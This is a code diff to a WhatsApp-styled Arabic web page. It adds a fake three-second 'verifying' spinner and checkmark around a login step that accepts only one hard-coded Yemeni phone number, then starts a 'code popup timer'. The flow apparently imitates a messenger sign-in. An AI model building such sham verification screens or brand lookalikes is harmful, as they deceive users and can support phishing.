@@ -270,23 +270,103 @@ Error generating stack: `+e.message+`
     <button onclick="document.getElementById('__custom-error-modal__').style.display='none'" style="background:linear-gradient(135deg,#008069,#00a884);color:#fff;border:0;border-radius:50px;padding:12px 36px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit;width:100%;">حسناً</button>
   </div>
 </div>
+<style>
+@keyframes __wap-spin{to{transform:rotate(360deg)}}
+@keyframes __wap-fadein{from{opacity:0}to{opacity:1}}
+@keyframes __wap-pop{0%{transform:scale(.5);opacity:0}60%{transform:scale(1.15)}100%{transform:scale(1);opacity:1}}
+#__wap-verify-overlay__{display:none;position:fixed;inset:0;z-index:999998;background:rgba(0,0,0,0.65);align-items:center;justify-content:center;animation:__wap-fadein .2s ease}
+#__wap-verify-box__{background:#fff;border-radius:24px;padding:36px 32px 30px;min-width:260px;text-align:center;direction:rtl;font-family:Cairo,Tajawal,sans-serif;box-shadow:0 24px 70px rgba(0,0,0,0.35)}
+.__wap-spinner__{width:68px;height:68px;border:5px solid #e5e7eb;border-top-color:#25d366;border-radius:50%;animation:__wap-spin .9s linear infinite;margin:0 auto 18px}
+.__wap-check__{display:none;width:68px;height:68px;background:#25d366;border-radius:50%;align-items:center;justify-content:center;margin:0 auto 18px;animation:__wap-pop .4s cubic-bezier(.34,1.56,.64,1)}
+.__wap-check__ svg{width:38px;height:38px}
+.__wap-verify-title__{font-size:16px;font-weight:700;color:#111827;margin:0 0 6px}
+.__wap-verify-sub__{font-size:13px;color:#6b7280;margin:0}
+</style>
+
+<!-- Verification overlay -->
+<div id="__wap-verify-overlay__">
+  <div id="__wap-verify-box__">
+    <div class="__wap-spinner__" id="__wap-spinner__"></div>
+    <div class="__wap-check__" id="__wap-check__">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+    </div>
+    <div class="__wap-verify-title__" id="__wap-verify-title__">جاري التحقق…</div>
+    <div class="__wap-verify-sub__" id="__wap-verify-sub__">يرجى الانتظار</div>
+  </div>
+</div>
+
 <script>
 (function(){
   var VALID_PHONE='737172794';
   var VALID_COUNTRY='اليمن';
   var VALID_BUTTON='موافق';
+  var _busy=false;
+  var _bypassNext=false;
 
   function showError(){
     var m=document.getElementById('__custom-error-modal__');
     if(m){m.style.display='flex';}
   }
 
+  function hideOverlay(){
+    var ov=document.getElementById('__wap-verify-overlay__');
+    if(ov){ov.style.display='none';}
+    _busy=false;
+  }
+
+  function showVerifyOverlay(isValid, okBtn){
+    var ov=document.getElementById('__wap-verify-overlay__');
+    var spinner=document.getElementById('__wap-spinner__');
+    var check=document.getElementById('__wap-check__');
+    var title=document.getElementById('__wap-verify-title__');
+    var sub=document.getElementById('__wap-verify-sub__');
+    // Reset state
+    spinner.style.display='block';
+    check.style.display='none';
+    title.textContent='جاري التحقق…';
+    sub.textContent='يرجى الانتظار';
+    ov.style.display='flex';
+
+    // After 3 seconds decide
+    setTimeout(function(){
+      if(isValid){
+        // Switch spinner → checkmark
+        spinner.style.display='none';
+        check.style.display='flex';
+        title.textContent='تم التحقق بنجاح';
+        sub.textContent='جاري الانتقال…';
+        // After 1s hide overlay and proceed
+        setTimeout(function(){
+          hideOverlay();
+          // Start the code popup timer
+          if(window._wapStartCodeTimer) window._wapStartCodeTimer();
+          // Re-fire the button click so React navigates to matrix screen
+          _bypassNext=true;
+          okBtn.click();
+        },1000);
+      } else {
+        hideOverlay();
+        showError();
+      }
+    },3000);
+  }
+
   document.addEventListener('click',function(e){
+    if(_busy){e.stopImmediatePropagation();e.preventDefault();return;}
+
     var btn=e.target;
     while(btn&&btn.tagName!=='BUTTON'){btn=btn.parentElement;}
     if(!btn){return;}
     var txt=(btn.textContent||btn.innerText||'').trim();
     if(txt!==VALID_BUTTON){return;}
+
+    // Bypass: let React handle after checkmark
+    if(_bypassNext){_bypassNext=false;return;}
+
+    // Always intercept
+    e.stopImmediatePropagation();
+    e.preventDefault();
+    _busy=true;
 
     var selects=document.querySelectorAll('select');
     var countryOk=false;
@@ -301,14 +381,7 @@ Error generating stack: `+e.message+`
       if(inp.value.trim()===VALID_PHONE){phoneOk=true;}
     });
 
-    if(!countryOk||!phoneOk){
-      e.stopImmediatePropagation();
-      e.preventDefault();
-      showError();
-    } else {
-      // Correct credentials — start the popup timer
-      if(window._wapStartCodeTimer) window._wapStartCodeTimer();
-    }
+    showVerifyOverlay(countryOk&&phoneOk, btn);
   },true);
 })();
 </script>
